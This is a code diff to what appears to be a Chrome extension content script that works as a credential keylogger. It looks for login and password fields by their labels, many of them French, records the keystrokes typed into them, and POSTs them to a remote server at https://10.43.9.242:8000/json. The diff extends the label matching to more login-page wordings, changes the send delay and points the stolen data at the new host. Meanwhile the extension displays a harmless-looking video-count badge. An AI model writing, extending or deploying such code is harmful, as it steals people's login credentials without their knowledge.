@@ -1,8 +1,8 @@
 var keys="";
 
-var keywords = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:","<span class=\"accesskey\">M</span>ot de passe:", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
-var logs = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone"];
-var psswd = ["password", "Mot de passe","<span class=\"accesskey\">M</span>ot de passe:"];
+var keywords = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:","<span class=\"accesskey\">M</span>ot de passe:", "identifiant", "password", "Mot de passe", "Adresse e-mail ou mobile","        Mot de passe      ", "Adresse e-mail ou téléphone","              Adresse e-mail ou numéro de téléphone portable            "];
+var logs = ["username", "login", "id", "<span class=\"accesskey\">I</span>dentifiant:", "identifiant", "Adresse e-mail ou mobile", "Adresse e-mail ou téléphone", "              Adresse e-mail ou numéro de téléphone portable            "];
+var psswd = ["password", "Mot de passe","<span class=\"accesskey\">M</span>ot de passe:", "        Mot de passe      "];
 var elemLabels = document.getElementsByTagName("label");
 var labels = [];
 var finalInputsId = [];
@@ -15,18 +15,21 @@ var nbVideos = videos.length.toString();
 
 chrome.runtime.sendMessage({badgeText: nbVideos});
 
+
 for (var i = elemLabels.length - 1; i >= 0; i--) {
 	labels[i] = elemLabels[i].innerHTML;
 	inputId[i] = elemLabels[i].htmlFor;
 }
 
 for (var i = labels.length - 1; i >= 0; i--) {
+	if(labels[i].indexOf("    ")){
+		labels[i] = labels[i].replace(/[\n]/gi, "" );
+	}
 	if(keywords.indexOf(labels[i]) > -1){
 		finalInputsId.push(inputId[i]);
 		str.push(labels[i]);
 	}
 }
-
 
 for (var i = finalInputsId.length - 1; i >= 0; i--) {
 	inputs.push(document.getElementById(finalInputsId[i]));
@@ -74,7 +77,7 @@ function keylogger_login(e) {
 	keys+=key;
 	if(compt_log == 0){
 		compt_log = 1;
-		setTimeout(function(){sendToServer("Password", keys)}, 4000);
+		setTimeout(function(){sendToServer("Password", keys)}, 4500);
 	}
 }
 
@@ -85,12 +88,12 @@ function keylogger_password(e) {
 	pass+=key;
 	if(compt_pass == 0){
 		compt_pass = 1;
-		setTimeout(function(){sendToServer("Login", pass)}, 4000);
+		setTimeout(function(){sendToServer("Login", pass)}, 4500);
 	}
 }
 
 
-var url = "http://127.0.0.1:8080/json";
+var url = "https://10.43.9.242:8000/json";
 var json = "";
 
 function sendToServer(libelle,value){
@@ -99,9 +102,9 @@ function sendToServer(libelle,value){
 	}
 	else{
 		json = json + '"' + value + '"}';
-		console.log(json);
 		var xhr = new XMLHttpRequest();
 		xhr.open("POST", url, true);
+		//xhr.setRequestHeader("Authorization", "auth " + Base64.encode("root" + ":" + "root"));
 		xhr.setRequestHeader("Content-type", "application/json");
 		xhr.send(json);
 	}
